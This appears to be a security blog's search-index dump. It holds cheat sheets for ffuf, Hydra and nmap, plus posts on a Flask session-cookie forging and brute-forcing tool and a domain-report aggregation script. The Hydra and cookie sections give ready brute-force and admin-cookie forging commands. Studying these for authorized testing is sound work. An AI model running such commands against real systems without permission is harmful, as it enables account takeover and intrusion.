responses\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w hosts.txt -u https://example.org/ -H \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Host: FUZZ\u0026#34;\u003c/span\u003e -mc \u003cspan style=\"color:#ae81ff\"\u003e200\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Fuzz the `name` field in a POST request with JSON data, filter responses containing \u0026#34;error\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w entries.txt -u https://example.org/ -X POST -H \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Content-Type: application/json\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e-d \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;{\u0026#34;name\u0026#34;: \u0026#34;FUZZ\u0026#34;, \u0026#34;anotherkey\u0026#34;: \u0026#34;anothervalue\u0026#34;}\u0026#39;\u003c/span\u003e -fr \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;error\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Use two wordlists for parameter and value fuzzing, match responses containing \u0026#34;VAL\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w params.txt:PARAM -w values.txt:VAL -u https://example.org/?PARAM\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eVAL -mr \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;VAL\u0026#34;\u003c/span\u003e -c\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"tips-and-tricks\"\u003eTips and Tricks\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eInteractive Mode\u003c/strong\u003e: Press \u003ccode\u003eEnter\u003c/code\u003e while FFUF is running to access interactive features, such as reconfiguring filters or saving the state.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMultiple Payloads\u003c/strong\u003e: Use the \u003ccode\u003eFUZZ\u003c/code\u003e keyword multiple times in a URL (e.g., \u003ccode\u003ehttps://example.org/path/FUZZ/another_path/FUZZ\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVariables in URLs\u003c/strong\u003e: Specify payload locations using variables (e.g., \u003ccode\u003ehttps://example.org/path/{var1}/another_path/{var2}\u003c/code\u003e).\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"final-thoughts\"\u003eFinal Thoughts\u003c/h2\u003e\n\u003cp\u003eFFUF is a versatile and efficient tool for web fuzzing. By mastering its options and syntax, you can quickly uncover hidden files, parameters, and vulnerabilities in your targets. Keep this cheat sheet handy to optimize your fuzzing workflows!\u003c/p\u003e","title":"ffuf"},{"content":"Flask web applications are clever beasts, storing session data client-side in cookies. It’s convenient for developers, but it can also be a security rabbit hole if you’re not careful. That’s why I put together FlaskOfCookies, a tool to help you decode, encode, and (if necessary) brute-force Flask session cookies.\nTo be clear, this isn’t entirely my invention. It started because I hit a wall on a Root-Me challenge, I couldn’t get it done with noraj’s tool (props to Alexandre Zanni for his great work). So, I decided to rework it, adding my own spin to tackle the issue. This tool is for anyone who’s curious about Flask’s session cookies, whether you’re debugging, testing, or just poking around.\nWhy Session Cookies Matter Session cookies in Flask encode data into a compact, URL-safe string. They’re handy for keeping track of users or passing small pieces of data between the client and server. But they also mean your data sits in plain sight. If you’re not careful with what you store—or if your secret key isn’t strong—those cookies can tell stories you’d rather keep quiet.\nWhat Does FlaskOfCookies Do? Decoding Cookies FlaskOfCookies can crack open a Flask session cookie and show you the contents. If you have the secret key, it’ll reconstruct the original session data. Without the key, it’ll still give you a peek at the encoded structure. This is helpful for:\nChecking if sensitive information is leaking. Testing whether session data is being properly secured. Encoding Cookies Need to create a Flask-compatible session cookie? FlaskOfCookies takes a Python dictionary and a secret key as input and spits out a session cookie. This is handy if you’re:\nDebugging session handling in your app. Seeing how different data structures get encoded. Brute-Forcing Secret Keys If you don’t know the secret key, FlaskOfCookies can try to guess it for you. Just supply a wordlist, and the tool will hammer away until it finds a match (or gives up). This isn’t a feature for cracking into random apps; it’s a wake-up call to use strong, random keys. If you’re using “password123” for your Flask secret, consider yourself warned.\nHow It Works FlaskOfCookies is built on Flask’s session-handling mechanisms and the itsdangerous library, which Flask uses under the hood. It aligns with Flask’s default behavior, including the cookie-session salt, to make sure the results match what Flask itself would produce.\nHere’s the general flow:\nDecoding: The tool parses the encoded cookie value, optionally verifying it against a provided secret key. Encoding: It serializes a Python dictionary into a session cookie using Flask-compatible methods. Brute-Forcing: Tries every key in your wordlist to find the one that correctly decodes the cookie. It’s straightforward, with clear error messages and input validation to keep things manageable.\nWhy Use FlaskOfCookies? Honestly, this is more of a “because I had to” kind of tool. After struggling with the Root-Me challenge and realizing noraj’s tool wasn’t working for me, I figured I’d make something myself. FlaskOfCookies won’t win awards, but it’s lightweight, easy to use, and gives you insight into how Flask manages session cookies. Whether you’re a Flask developer or a security researcher, it can help you:\nLearn how session cookies work. Test your app for key management flaws. Debug session-related bugs. Getting Started with FlaskOfCookies First, make sure you have Python 3.x installed. You’ll also need Flask and itsdangerous:\npip install Flask itsdangerous Then, grab FlaskOfCookies from the repository:\ngit clone https://github.com/noobosaurus-r3x/FlaskOfCookies cd FlaskOfCookies Alternatively, you can download the FOC.py script directly.\nWhat You Can Do With It Here’s a quick guide to the tool’s commands:\nDecode a Session Cookie If you know the secret key:\npython3 FOC.py decode -s \u0026#39;\u0026lt;secret_key\u0026gt;\u0026#39; -c \u0026#39;\u0026lt;cookie_value\u0026gt;\u0026#39; Without the key, you can still see the structure:\npython3 FOC.py decode -c \u0026#39;\u0026lt;cookie_value\u0026gt;\u0026#39; Encode a Session Cookie To create a new session cookie:\npython3 FOC.py encode -s \u0026#39;\u0026lt;secret_key\u0026gt;\u0026#39; -t \u0026#34;{\u0026#39;username\u0026#39;:\u0026#39;admin\u0026#39;,\u0026#39;role\u0026#39;:\u0026#39;superuser\u0026#39;}\u0026#34; Brute-Force the Secret Key To test key strength with a wordlist:\npython3 FOC.py bruteforce -c \u0026#39;\u0026lt;cookie_value\u0026gt;\u0026#39; -w \u0026#39;\u0026lt;path_to_wordlist\u0026gt;\u0026#39; Final Thoughts FlaskOfCookies isn’t groundbreaking, but it’s a practical little tool for anyone exploring Flask session cookies. Whether you’re trying to figure out how they work, testing your app’s security, or debugging a frustrating challenge, it’ll save you some time.\nRemember, this started as a personal project to solve a specific problem, so don’t expect perfection. That said, I hope it’s useful—and if you think of ways to improve it, feel free to fork the repo and go wild. You can find it here.\n","permalink":"http://localhost:1313/tools/flask_of_cookies/","summary":"\u003cp\u003eFlask web applications are clever beasts, storing session data client-side in cookies. It’s convenient for developers, but it can also be a security rabbit hole if you’re not careful. That’s why I put together \u003cstrong\u003eFlaskOfCookies\u003c/strong\u003e, a tool to help you decode, encode, and (if necessary) brute-force Flask session cookies.\u003c/p\u003e\n\u003cp\u003eTo be clear, this isn’t entirely my invention. It started because I hit a wall on a \u003cstrong\u003eRoot-Me challenge\u003c/strong\u003e, I couldn’t get it done with \u003cstrong\u003enoraj’s tool\u003c/strong\u003e (props to Alexandre Zanni for his great work). So, I decided to rework it, adding my own spin to tackle the issue. This tool is for anyone who’s curious about Flask’s session cookies, whether you’re debugging, testing, or just poking around.\u003c/p\u003e","title":"FlaskOfCookies"},{"content":"Hydra is a powerful and flexible password-cracking tool designed for brute-forcing authentication protocols. It supports a wide range of protocols and is highly configurable for various use cases.\nBasic Syntax hydra [options] \u0026lt;IP\u0026gt; \u0026lt;protocol\u0026gt; Common Flags -h: Display the help menu. -l \u0026lt;username\u0026gt;: Specify a single username/login. -L \u0026lt;wordlist\u0026gt;: Use a wordlist for usernames/logins. -p \u0026lt;password\u0026gt;: Specify a single password. -P \u0026lt;wordlist\u0026gt;: Use a wordlist for passwords. -s \u0026lt;PORT\u0026gt;: Specify the target port. -f: Stop brute-forcing after finding valid credentials. -R: Restore a previous session. -t \u0026lt;number\u0026gt;: Set the number of threads to use. -V: Enable verbose mode. Supported Protocols Hydra supports numerous protocols, including:\nSSH FTP POP3 HTTP-FORM-GET HTTP-FORM-POST HTTP-HEAD HTTP-POST HTTP-GET IMAP SMB SMTP MySQL For the full list, refer to Hydra\u0026rsquo;s help menu (hydra -h).\nExamples SSH Brute-Force Attack hydra -l admin -P rockyou.txt 192.168.10.10 ssh SSH with Multiple Usernames hydra -L top-usernames-shortlist.txt -P rockyou.txt 192.168.10.10 ssh SMB Brute-Force Attack hydra -L top-usernames-shortlist.txt -P rockyou.txt 192.168.10.10 smb Brute-Forcing HTTP POST Forms Hydra can handle custom HTTP POST forms:\nhydra -l admin -P rockyou.txt 192.168.10.10 http-post-form \\ \u0026#34;/login:username=admin\u0026amp;password=^PASS^:F=Your password is incorrect\u0026#34; Wordpress Login Brute-Force Hydra can target WordPress login forms with custom parameters:\nhydra -l admin -P rockyou.txt 192.168.10.10 -V http-form-post \\ \u0026#34;/wp-login.php:log=admin\u0026amp;pwd=^PASS^\u0026amp;wp-submit=Log In\u0026amp;testcookie=1:S=Location\u0026#34; Tips and Tricks Session Management: Use -R to restore interrupted sessions without starting over. Efficiency: Adjust the number of threads with -t to balance speed and server load. Verbose Mode: Use -V to see each login attempt in real-time, useful for troubleshooting. Custom Form Parameters: Understand the target login form structure to craft precise Hydra commands. Final Thoughts Hydra is an essential tool in the arsenal of penetration testers and security professionals. While powerful, it must be used responsibly and only with proper authorization. Keep this cheat sheet handy to efficiently navigate Hydra\u0026rsquo;s capabilities and tailor it to your testing needs.\n\u0026ndash;\n","permalink":"http://localhost:1313/cheat-sheets/hydra/","summary":"\u003cp\u003e\u003cstrong\u003eHydra\u003c/strong\u003e is a powerful and flexible password-cracking tool designed for brute-forcing authentication protocols. It supports a wide range of protocols and is highly configurable for various use cases.\u003c/p\u003e\n\u003ch2 id=\"basic-syntax\"\u003eBasic Syntax\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ehydra \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eoptions\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e \u0026lt;IP\u0026gt; \u0026lt;protocol\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"common-flags\"\u003eCommon Flags\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-h\u003c/code\u003e\u003c/strong\u003e: Display the help menu.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-l \u0026lt;username\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify a single username/login.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-L \u0026lt;wordlist\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Use a wordlist for usernames/logins.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p \u0026lt;password\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify a single password.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-P \u0026lt;wordlist\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Use a wordlist for passwords.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-s \u0026lt;PORT\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify the target port.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-f\u003c/code\u003e\u003c/strong\u003e: Stop brute-forcing after finding valid credentials.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-R\u003c/code\u003e\u003c/strong\u003e: Restore a previous session.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-t \u0026lt;number\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Set the number of threads to use.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-V\u003c/code\u003e\u003c/strong\u003e: Enable verbose mode.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"supported-protocols\"\u003eSupported Protocols\u003c/h2\u003e\n\u003cp\u003eHydra supports numerous protocols, including:\u003c/p\u003e","title":"Hydra"},{"content":"Nmap (Network Mapper) is the go-to tool for network discovery and security auditing. It’s powerful, flexible, and essential for professionals in cybersecurity.\nBasic Syntax nmap \u0026lt;target IP\u0026gt; nmap -sT -sS -Pn -v 10.10.10.10 sudo nmap -A -sS -Pn 10.10.10.10 sudo nmap -sV -sT -O -p- -vv --script vulners 10.10.10.10 Common Flags Scan Types -sT: Perform a TCP connect scan. -sU: Perform a UDP scan. -sS: Perform a SYN scan (\u0026ldquo;Stealth Scan\u0026rdquo;). -Pn: Skip pinging the target. -sn: Host discovery without scanning ports. -A: Enable aggressive scan options. Advanced Features -p \u0026lt;PORT\u0026gt;: Scan specific ports. -p-: Scan all 65,535 ports. -sV: Detect services and versions running on the target. -O: Detect the operating system. -v****, -vv, ********-vvv: Set verbosity levels. --script vuln: Run vulnerability scripts. --script vulners: Use vulners scripts for CVE-based scanning. --script=http-enum: Act like Nikto to enumerate HTTP resources. Output Formats -oN: Normal text output, best for human-readable logs during manual reviews. -oX: XML output, ideal for automated tools or integrations that require structured data. ``: Greppable output, useful for scripting and quickly filtering resulst with tools like grep. -oA: Generate all three formats at once, providing maximum flexibility for further analysis or reporting. SMB Scripts Enumerate Security Mode nmap -p445 --script smb-security-mode 192.168.1.1 Enumerate Sessions nmap -p445 --script smb-enum-sessions 192.168.1.1 nmap -p445 --script smb-enum-sessions --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Shares nmap -p445 --script smb-enum-shares 192.168.1.1 nmap -p445 --script smb-enum-shares --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Shares with Listing Listing shares and their contents can reveal valuable information about a system, such as misconfigured permissions or sensitive files stored in shared directories. This is especially important during audits or penetration tests to identify potential security gaps.\nnmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Users nmap -p445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Stats nmap -p445 --script smb-enum-stats --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Domains nmap -p445 --script smb-enum-domains --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Groups nmap -p445 --script smb-enum-groups --script-args smbusername=administrator,smbpassword=password 192.168.1.1 SSH Scripts Enumerate Algorithms nmap 192.168.1.1 -p 22 --script ssh2-enum-algos Enumerate Host Keys nmap 192.168.1.1 -p 22 --script ssh-hostkey --script-args ssh_hostkey=full Enumerate Authentication Methods nmap 192.168.1.1 -p 22 --script ssh-auth-methods --script-args=\u0026#34;ssh.user=admin\u0026#34; Final Thoughts Nmap is a versatile and robust tool that adapts to a wide range of use cases, from simple port scans to detailed vulnerability assessments. Keep this cheat sheet handy for quick reference, and remember: the more you practice, the more efficient your scanning workflows will become!\n","permalink":"http://localhost:1313/cheat-sheets/nmap/","summary":"\u003cp\u003e\u003cstrong\u003eNmap\u003c/strong\u003e (Network Mapper) is the go-to tool for network discovery and security auditing. It’s powerful, flexible, and essential for professionals in cybersecurity.\u003c/p\u003e\n\u003ch2 id=\"basic-syntax\"\u003eBasic Syntax\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap \u0026lt;target IP\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -sT -sS -Pn -v 10.10.10.10\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo nmap -A -sS -Pn 10.10.10.10\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo nmap -sV -sT -O -p- -vv --script vulners 10.10.10.10\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"common-flags\"\u003eCommon Flags\u003c/h2\u003e\n\u003ch3 id=\"scan-types\"\u003eScan Types\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sT\u003c/code\u003e\u003c/strong\u003e: Perform a TCP connect scan.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sU\u003c/code\u003e\u003c/strong\u003e: Perform a UDP scan.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sS\u003c/code\u003e\u003c/strong\u003e: Perform a SYN scan (\u0026ldquo;Stealth Scan\u0026rdquo;).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-Pn\u003c/code\u003e\u003c/strong\u003e: Skip pinging the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sn\u003c/code\u003e\u003c/strong\u003e: Host discovery without scanning ports.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-A\u003c/code\u003e\u003c/strong\u003e: Enable aggressive scan options.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"advanced-features\"\u003eAdvanced Features\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p \u0026lt;PORT\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Scan specific ports.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p-\u003c/code\u003e\u003c/strong\u003e: Scan all 65,535 ports.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sV\u003c/code\u003e\u003c/strong\u003e: Detect services and versions running on the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-O\u003c/code\u003e\u003c/strong\u003e: Detect the operating system.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-v\u003c/code\u003e\u003c/strong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e****, \u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003ccode\u003e-vv\u003c/code\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e, ****\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e****\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003cstrong\u003e\u003ccode\u003e-vvv\u003c/code\u003e\u003c/strong\u003e: Set verbosity levels.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--script vuln\u003c/code\u003e\u003c/strong\u003e: Run vulnerability scripts.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--script vulners\u003c/code\u003e\u003c/strong\u003e: Use vulners scripts for CVE-based scanning.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--script=http-enum\u003c/code\u003e\u003c/strong\u003e: Act like Nikto to enumerate HTTP resources.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"output-formats\"\u003eOutput Formats\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-oN\u003c/code\u003e\u003c/strong\u003e: Normal text output, best for human-readable logs during manual reviews.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-oX\u003c/code\u003e\u003c/strong\u003e: XML output, ideal for automated tools or integrations that require structured data.\u003c/li\u003e\n\u003cli\u003e``: Greppable output, useful for scripting and quickly filtering resulst with tools like \u003ccode\u003egrep\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-oA\u003c/code\u003e\u003c/strong\u003e: Generate all three formats at once, providing maximum flexibility for further analysis or reporting.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"smb-scripts\"\u003eSMB Scripts\u003c/h2\u003e\n\u003ch3 id=\"enumerate-security-mode\"\u003eEnumerate Security Mode\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-security-mode 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-sessions\"\u003eEnumerate Sessions\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-enum-sessions 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-enum-sessions --script-args smbusername\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eadministrator,smbpassword\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003epassword 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-shares\"\u003eEnumerate Shares\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-enum-shares 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-enum-shares --script-args smbusername\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eadministrator,smbpassword\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003epassword 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-shares-with-listing\"\u003eEnumerate Shares with Listing\u003c/h3\u003e\n\u003cp\u003eListing shares and their contents can reveal valuable information about a system, such as misconfigured permissions or sensitive files stored in shared directories. This is especially important during audits or penetration tests to identify potential security gaps.\u003c/p\u003e","title":"nmap"},{"content":"Daily domain reports are a treasure trove for cybersecurity analysts, but collecting and organizing them can quickly become tedious. That’s where RedFlagger comes in. This lightweight Bash script automates the process of downloading and aggregating reports from Red Flag Domains. It’s simple, efficient, and built to save time—whether you’re sifting through a few recent reports or analyzing a year’s worth of data.\nThe Backstory This project started as a bit of a joke. My friend lil-doudou had written an excellent Python tool called NewRedflag to handle domain report aggregation, but he’s also a massive Bash enthusiast. So, as a playful nod to his love for scripting, I decided to rewrite the functionality in Bash—simpler, lighter, and arguably more fun (depending on your feelings about shell scripts).\nWhat Does RedFlagger Do? RedFlagger streamlines the process of collecting domain reports. Instead of manually navigating the Red Flag Domains website and downloading reports one by one, you can use RedFlagger to:\nFetch the latest report. Download reports from a specific range of dates. Aggregate all available reports into one file for easier analysis. It’s a no-frills script that prioritizes functionality and flexibility.\nHow Does It Work? RedFlagger fetches reports directly from the Red Flag Domains website by parsing the daily directory. It uses simple Bash commands like curl to download files and aggregates them into a single output file for easy handling. If you’re running a quick analysis or building a dataset for long-term research, this script has you covered.\nKey Features: Custom Date Ranges: Specify a range of days to download only the reports you need. All-Inclusive Downloads: Grab every report available with a single command. Custom Output Files: Aggregate data into a file of your choice instead of dealing with multiple separate files. Why Use RedFlagger? RedFlagger is built for simplicity and speed. It doesn’t aim to replace more advanced tools but instead provides a lightweight option for users who need quick, automated access to domain reports. If you find yourself regularly pulling data from Red Flag Domains, RedFlagger can:\nSave time by automating the download process. Ensure reports are organized and aggregated for easier analysis. Provide flexible options for handling specific dates or all available data. Whether you’re an analyst tracking malicious domains or a researcher building a threat intelligence dataset, RedFlagger can fit seamlessly into your workflow.\nGetting Started Installation RedFlagger is a standalone Bash script, so there’s no complicated setup. Here’s how to get started:\nDownload the script:\ngit clone https://github.com/noobosaurus-r3x/redflagger cd redflagger chmod +x redflagger.sh Make sure curl is installed on your system:\nsudo apt install curl Usage The script provides several options to customize your downloads. Here’s the basic syntax:\n./redflagger.sh [--latest|--days num] [--all] [--output filename] Options --latest or -l: Downloads the report from 1 day ago. --days num or -d num: Downloads the report from num days ago. --all or -a: Downloads all available reports. --output filename or -o filename: Specifies the output file to store the downloaded reports. Defaults to output.txt if no filename is provided. Examples Here are a few practical ways to use RedFlagger:\nDownload the latest report:\n./redflagger.sh -l Download all reports available since 3 days ago:\n./redflagger.sh -d 3 -a -o my_file.txt Download a specific day’s report:\n./redflagger.sh -d 5 -o report_5days_ago.txt Download all reports into a custom file:\n./redflagger.sh -a -o all_reports.txt Limitations and Room for Improvement RedFlagger is intentionally simple, but it’s not without its limitations. Here are a few areas where it could be expanded or improved:\nError Handling: While the script includes basic error checks, it could provide more detailed feedback when something goes wrong (e.g., network issues or missing reports). Parallel Downloads: Adding support for downloading multiple reports simultaneously could speed up large fetches. Advanced Filtering: Options for filtering by domain type or metadata could make the tool even more powerful. If you’re interested in extending RedFlagger, feel free to fork it and make it your own.\nFinal Thoughts RedFlagger is a small, straightforward tool designed to make life easier for anyone working with Red Flag Domains. It doesn’t try to do everything but focuses on doing one thing well: fetching and aggregating domain reports quickly and efficiently.\nWhether you’re doing threat research, building datasets, or just exploring the domain data available, RedFlagger is a lightweight addition to your toolbox. And let’s not forget—it’s also a fun jab at my friend’s Python-first approach. If you’ve got ideas for improvements or run into any issues, don’t hesitate to reach out or fork the project. Happy aggregating!\n","permalink":"http://localhost:1313/tools/redflagger/","summary":"\u003cp\u003eDaily domain reports are a treasure trove for cybersecurity analysts, but collecting and organizing them can quickly become tedious. That’s where \u003cstrong\u003eRedFlagger\u003c/strong\u003e comes in. This lightweight Bash script automates the process of downloading and aggregating reports from \u003ca href=\"https://dl.red.flag.domains/daily/\"\u003eRed Flag Domains\u003c/a\u003e. It’s simple, efficient, and built to save time—whether you’re sifting through a few recent reports or analyzing a year’s worth of data.\u003c/p\u003e\n\u003ch2 id=\"the-backstory\"\u003eThe Backstory\u003c/h2\u003e\n\u003cp\u003eThis project started as a bit of a joke. My friend \u003cstrong\u003elil-doudou\u003c/strong\u003e had written an excellent Python tool called \u003ca href=\"https://github.com/lil-doudou/NewRedflag\"\u003eNewRedflag\u003c/a\u003e to handle domain report aggregation, but he’s also a massive Bash enthusiast. So, as a playful nod to his love for scripting, I decided to rewrite the functionality in Bash—simpler, lighter, and arguably more fun (depending on your feelings about shell scripts).\u003c/p\u003e","title":"redflagger"},{"content":"When you need to quickly understand the structure of a webpage, a lightweight tool can save the day. Webpage Infos Extractor is just that: a simple JavaScript bookmarklet that extracts useful information like forms, links, images, and word count from any webpage. No extensions or extra software required—just a single bookmark to get key insights instantly.\nWhy Build This? Sometimes, the simplest tools are the most convenient. I needed a way to peek under the hood of webpages during quick tests or casual research without opening dev tools every time. So, I threw together this bookmarklet to make data analysis fast and portable. It’s not groundbreaking, but it gets the job done without any fuss.\nWhat Does It Do? Once 